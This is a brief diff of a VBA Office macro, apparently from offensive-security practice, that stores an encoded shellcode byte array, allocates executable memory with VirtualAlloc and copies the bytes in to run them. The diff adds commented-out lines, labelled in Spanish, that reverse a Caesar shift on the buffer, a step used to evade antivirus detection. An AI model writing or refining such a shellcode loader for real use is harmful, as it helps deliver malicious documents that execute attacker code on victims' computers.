@@ -15,6 +15,11 @@ Function MyMacro()
     ...
     06,0,89,187,224,29,42,10,65,137,218,255,213)
 
+// Esto es para descifrar caesar
+#For i = 0 To UBound(buf)
+#    buf(i) = (buf(i) - 2 + 256) Mod 256
+#Next i
+
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
     
     For counter = LBound(buf) To UBound(buf)
